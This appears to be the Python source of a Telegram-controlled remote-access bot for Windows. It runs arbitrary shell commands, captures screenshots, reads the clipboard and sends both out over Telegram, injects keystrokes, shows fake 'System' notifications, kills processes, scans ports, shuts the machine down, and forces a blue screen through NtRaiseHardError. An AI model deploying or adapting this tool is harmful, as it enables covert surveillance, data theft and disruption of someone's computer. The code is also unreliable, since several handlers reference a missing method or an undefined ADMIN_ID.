import telebot
import ctypes
from ctypes import wintypes
import os

class Core:
    def __init__(self, token):
        self.bot = telebot.TeleBot(token)
        self.ADMIN_ID = 1234567890
        self.display_pass = True

        self.text = """
        __________________________________________________________
        
    /help - show all commands\n
    /scr - takes a screenshot of the entire screen\n
    /cmd - runs command from cmd\n
    /write - entrys any text\n
    /key - presses any keys\n
    /ct_notify - dialog window based on ctypes\n
    /pl_notify - notification based on plyer\n
    /sinfo - all information about system\n
    /pinfo - info about all active windows\n
    /clipb - getting any text from clipboard\n
    /web - opening any urls\n
    /mon - off, on and lock display\n 
    /wkill - killing active window\n
    /shutdown - shutdown or reboot pc\n
    /pscan - scanning all ports\n
    /bsod - blue screen of death\n
        """

        self.bind_handlers()

    def bind_handlers(self):
        @self.bot.message_handler(commands=['start'])
        def _start(message):
            self.start_command(message)

        @self.bot.message_handler(commands=['help'])
        def _help(message):
            self.help_command(message)

        @self.bot.message_handler(commands=['cmd'])
        def _cmd(message):
            self.cmd_command(message)

        @self.bot.message_handler(commands=['scr'])
        def _screenshot(message):
            self.screenshot_command(message)

        @self.bot.message_handler(commands=['write'])
        def _pywrite(message):
            self.write_command(message)

        @self.bot.message_handler(commands=['key'])
        def _pykey(message):
            self.key_command(message)

        @self.bot.message_handler(commands=['ct_notify'])
        def _ctnotif(message):
            self.notify_command(message)

        @self.bot.message_handler(commands=['pl_notify'])
        def _plnotif(message):
            self.pl_notif(message)

        @self.bot.message_handler(commands=["mon"])
        def _moff(message):
            self.monitor_commands(message)

        @self.bot.message_handler(commands=["wkill"])
        def _wkill(message):
            self.window_kill_command(message)

        @self.bot.message_handler(commands=['sinfo'])
        def _sysinfo(message):
            self.sinfo_command(message)

        @self.bot.message_handler(commands=['pinfo'])
        def _procinfo(message):
            self.list_all_windows(message)

        @self.bot.message_handler(commands=['clipb'])
        def _wclipboard(message):
            self.get_clipboard(message)

        @self.bot.message_handler(commands=['web'])
        def _openweb(message):
            self.web_command(message)

        @self.bot.message_handler(commands=['pscan'])
        def _scanports(message):
            self.scan_port(message)

        @self.bot.message_handler(commands=['shutdown'])
        def _shutdown(message):
            self.shutdown_command(message)

        @self.bot.message_handler(commands=['bsod'])
        def _bsd(message):
            self.bsod_command(message)


    def start_command(self, message):
        if message.from_user.id != self.ADMIN_ID:
            user = message.from_user
            self.bot.send_message(self.ADMIN_ID, f"КТО-ТО ПОПЫТАЛСЯ ПОЛУЧИТЬ ДОСТУП К БОТУ\n@{user.username}\nID: {user.id}")
            return
        self.help_command(message)

    def help_command(self, message):
        if message.from_user.id != self.ADMIN_ID:
            return
        self.bot.reply_to(message, self.text)

    def cmd_command(self, message):
        import subprocess
        if message.from_user.id != self.ADMIN_ID:
            return

        cmd = message.text.replace("/cmd ", "").strip()
        if not cmd:
            self.bot.reply_to(message, "command?")
            return

        process = subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE, stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True, encoding='cp866',)
        stdout, stderr = process.communicate()
        if stderr:
            print(f"Обнаружена ошибка: {stderr}")
        else:
            print("Ошибок нет.")
        self.bot.reply_to(message, f"Команда выполнена: {cmd}")

    def screenshot_command(self, message):
        import pyautogui
        if message.from_user.id != self.ADMIN_ID:
            return

        screenshot = pyautogui.screenshot()
        path = "screen.png"
        screenshot.save(path)
        with open(path, "rb") as photo:
            self.bot.send_photo(message.chat.id, photo)
        os.remove(path)

    def write_command(self, message):
        if message.from_user.id != self.ADMIN_ID:
            return

        from pynput.keyboard import Controller
        keyboard = Controller()

        text = message.text.replace("/write ", "").strip()
        if not text:
            self.bot.reply_to(message, "write any text")
            return

        keyboard.type(text)
        self.bot.reply_to(message, f"writed: {text}")

    def key_command(self, message):
        if message.from_user.id != self.ADMIN_ID:
            return


        from pynput.keyboard import Controller, Key
        keyboard = Controller()

        special_keys = {
            "enter": Key.enter,
            "space": Key.space,
            "tab": Key.tab,
            "shift": Key.shift,
            "ctrl": Key.ctrl,
            "alt": Key.alt,
            "backspace": Key.backspace,
            "esc": Key.esc,
            "up": Key.up,
            "down": Key.down,
            "left": Key.left,
            "right": Key.right,
            "f1": Key.f1,
            "f2": Key.f2,
            "f3": Key.f3,
            "f4": Key.f4,
            "f5": Key.f5,
            "f6": Key.f6,
            "f7": Key.f7,
            "f8": Key.f8,
            "f9": Key.f9,
            "f10": Key.f10,
            "f11": Key.f11,
            "f12": Key.f12,
        }

        key_text = message.text.replace("/key ", "").strip()
        if not key_text:
            self.bot.reply_to(message, f"{special_keys}")
            return

        try:
            if "+" in key_text:
                combo = key_text.split("+")
                keys = [special_keys.get(k.lower(), k) for k in combo]
                for k in keys:
                    keyboard.press(k)
                for k in reversed(keys):
                    keyboard.release(k)
            else:
                key = special_keys.get(key_text.lower(), key_text)
                keyboard.press(key)
                keyboard.release(key)

            self.bot.reply_to(message, f"key pressed: {key_text}")

        except Exception as e:
            self.bot.reply_to(message, f"error: {e}")

    def notify_command(self, message):
        import threading as th
        if message.from_user.id != self.ADMIN_ID:
            return
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            self.bot.reply_to(message, "/ct_notify [text]")
            return
        text = parts[1]

        th.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, text, " ", 0x10), daemon=True).start()
        self.bot.reply_to(message, f"Message was shown\ntext: {text}")

    def pl_notif(self, message):
        if message.from_user.id != self.ADMIN_ID:
            return

        from plyer import notification
        import threading as th

        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            self.bot.reply_to(message, "preview /pl_notify [заголовок] [текст]")
            return

        title = parts[1].lower()
        text = parts[2]

        th.Thread(target=lambda: notification.notify(title=title, message=text, app_name="System", timeout=10),daemon=True).start()
        self.bot.reply_to(message, f"уведомление показано:\nЗаголовок: {title}\nТекст: {text}")



    def moff_command(self, message):
        if self.display_pass:
            if message.from_user.id != self.ADMIN_ID:
                return
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        return self.bot.send_message(self.ADMIN_ID, "display was turned off")

    def mon_command(self, message):
        if self.display_pass:
            if message.from_user.id != self.ADMIN_ID:
                return
        import time
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
        ctypes.windll.user32.mouse_event(0x0001, 1, 1, 0, 0)
        time.sleep(0.1)
        ctypes.windll.user32.mouse_event(0x0001, -1, -1, 0, 0)
        return self.bot.send_message(self.ADMIN_ID, "display was turned on")

    def mlock_command(self, message):
        if self.display_pass:
            if message.from_user.id != self.ADMIN_ID:
                return
        ctypes.windll.user32.LockWorkStation()
        return self.bot.send_message(self.ADMIN_ID, "display was locked")


    def monitor_commands(self, message):
        if message.from_user.id != self.ADMIN_ID:
            return
        self.display_pass = False
        commands = {
            "on": self.mon_command,
            "off": self.moff_command,
            "lock": self.mlock_command,
        }

        args = message.text.split()

        if len(args) < 2:
            return self.bot.reply_to(message, "arguments: on, off, lock")

        action = args[1].lower()
        command_func = commands.get(action)

        if command_func:
            response = command_func(self.ADMIN_ID)
            if response:
                pass
            else:
                self.bot.send_message(self.ADMIN_ID, f"Команда {action} выполнена, но отчет не получен.")
        else:
            self.bot.reply_to(message, "unknown argument\narguments: on, off, lock")

    def window_kill_command(self, message):
        if message.from_user.id != self.ADMIN_ID:
            return

        user32 = ctypes.windll.user32
        hwnd = user32.GetForegroundWindow()

        length = user32.GetWindowTextLengthW(hwnd)
        if length > 0:
            buff = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buff, length + 1)
            title = buff.value
        else:
            title = "Заголовок отсутствует"

        pid = wintypes.DWORD()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        pid_value = pid.value

        info_text = f"Window: {title}\nHWND:{hwnd}\nPID: {pid_value}\n\nЗакрыть? (y/n)"
        sent_msg = self.bot.send_message(message.chat.id, info_text)

        self.bot.register_next_step_handler(sent_msg, self.process_answer, hwnd, pid_value, title)

    def process_answer(self, message, hwnd, pid_value, title):
        user32 = ctypes.windll.user32
        answer = message.text.lower().strip()
        if answer in ("y", "u", "н", "г"):
            if user32.IsWindow(hwnd):
                os.system(f"taskkill /PID {pid_value} /F /T >nul 2>&1")
                self.bot.send_message(message.chat.id, f"{title}\nPID: {pid_value}\nwas closed")
            else:
                self.bot.send_message(message.chat.id, "window not found")

        elif answer in ("n", "m", "ь", "б"):
            self.bot.send_message(message.chat.id, "cancelled")
        else:
            self.bot.send_message(message.chat.id, "??? restart /wkill")

    def sinfo_command(self, message):
        if message.from_user.id != self.ADMIN_ID:
            return

        import psutil
        import platform

        self.bot.reply_to(message, f"{platform.system()}\n{platform.node()}\n{platform.platform()}\n{platform.machine()}\n"
                              f"{platform.python_build()}\n{platform.python_compiler()}\n{platform.processor()}\n"
                              f"{platform.python_version()}\n{psutil.cpu_count()}\n{psutil.virtual_memory()}")

    def list_all_windows(self, message):
        if message.from_user.id != self.ADMIN_ID:
            return
        user32 = ctypes.windll.user32
        WNDENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
        windows_list = []

        # noinspection PyUnusedLocal
        def enum_windows_proc(hwnd, lparam):
            if user32.IsWindowVisible(hwnd):
                length = user32.GetWindowTextLengthW(hwnd)
                if length > 0:
                    buff = ctypes.create_unicode_buffer(length + 1)
                    user32.GetWindowTextW(hwnd, buff, length + 1)
                    windows_list.append(f"ID `{hwnd}`\nTitle: {buff.value}")
            return True

        user32.EnumWindows(WNDENUMPROC(enum_windows_proc), 0)

        if windows_list:
            full_message = "*Windows list:*\n\n" + "\n\n".join(windows_list)
            self.bot.send_message(message.chat.id, full_message, parse_mode="Markdown")
        else:
            self.bot.send_message(message.chat.id, "windows not found")

    def get_clipboard(self, message):
        if message.from_user.id != self.ADMIN_ID:
            return

        from ctypes import wintypes
        CF_UNICODETEXT = 13

        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32

        user32.OpenClipboard.argtypes = [wintypes.HWND]

        user32.GetClipboardData.restype = wintypes.HANDLE
        user32.GetClipboardData.argtypes = [wintypes.UINT]

        kernel32.GlobalLock.argtypes = [wintypes.HGLOBAL]
        kernel32.GlobalLock.restype = wintypes.LPVOID

        kernel32.GlobalUnlock.argtypes = [wintypes.HGLOBAL]

        def get_clipboard_text():
            text = None

            if user32.OpenClipboard(None):
                try:
                    h_data = user32.GetClipboardData(CF_UNICODETEXT)
                    if h_data:
                        ptr = kernel32.GlobalLock(h_data)
                        if ptr:
                            text = ctypes.c_wchar_p(ptr).value
                            kernel32.GlobalUnlock(h_data)
                finally:
                    user32.CloseClipboard()

            return text

        data = get_clipboard_text()
        if data:
            self.bot.send_message(ADMIN_ID, f"clipboard: {data}")

    def web_command(self, message):
        if message.from_user.id != self.ADMIN_ID:
            return

        import webbrowser
        url = message.text.replace("/web ", "").strip()
        webbrowser.open(url)
        self.bot.reply_to(message, "url was opened")

    def scan_port(self, message):
        if message.from_user.id != self.ADMIN_ID:
            return
        import port_scan
        port_scan.run()

    def shutdown_command(self, message):
        if message.from_user.id != self.ADMIN_ID:
            return

        import subprocess
        parts = message.text.split(maxsplit=1)
        arg = parts[1]
        if len(parts) < 2:
            self.bot.send_message(ADMIN_ID, "arguments\ns - shutdown\nr - reboot")
            return

        if arg == "s":
            try:
                subprocess.run(["shutdown", "/S", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW)
            except Exception as e:
                self.bot.send_message(ADMIN_ID, f"error\n{e}")
            self.bot.send_message(ADMIN_ID, "pc was shutdowned")
            return

        if arg == "r":
            try:
                subprocess.run(["shutdown", "/R", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW)
            except Exception as e:
                self.bot.send_message(ADMIN_ID, f"error\n{e}")
            self.bot.send_message(ADMIN_ID, "pc was rebooted")
            return

    def bsod_ctypes(self, message):
        if message.from_user.id != self.ADMIN_ID:
            return

        ntdll = ctypes.windll.ntdll
        enabled = ctypes.c_bool()
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))

        response = ctypes.c_uint()
        ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(response))


    def run(self):
        print(True)
        self.bot.polling(none_stop=True)

if __name__ == '__main__':
    TOKEN = "your token"
    app = Core(TOKEN)
    app.run()